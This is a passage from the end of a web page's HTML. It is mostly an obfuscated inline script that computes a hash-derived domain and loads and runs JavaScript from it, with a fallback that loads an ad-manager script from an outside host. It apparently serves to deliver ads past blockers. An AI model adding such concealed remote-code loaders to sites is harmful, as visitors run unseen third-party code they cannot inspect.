7f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>